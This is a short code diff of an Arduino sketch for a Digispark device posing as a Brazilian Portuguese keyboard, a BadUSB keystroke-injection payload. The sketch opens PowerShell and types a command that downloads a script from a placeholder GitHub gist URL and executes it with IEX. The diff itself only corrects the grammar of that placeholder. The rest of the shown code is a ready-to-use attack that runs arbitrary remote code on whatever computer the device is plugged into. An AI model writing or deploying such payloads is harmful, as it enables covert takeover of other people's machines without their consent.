@@ -9,7 +9,7 @@ void loop() {
   DigiKeyboardPtBr.delay(2000);
   DigiKeyboardPtBr.println("powershell");
   DigiKeyboardPtBr.delay(2000);
-  DigiKeyboardPtBr.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('Colar a url do arquivo criada no gist github ');\"");
+  DigiKeyboardPtBr.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('Colar a url do arquivo criado no gist github ');\"");
   DigiKeyboardPtBr.delay(2000);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   for (;;) {}
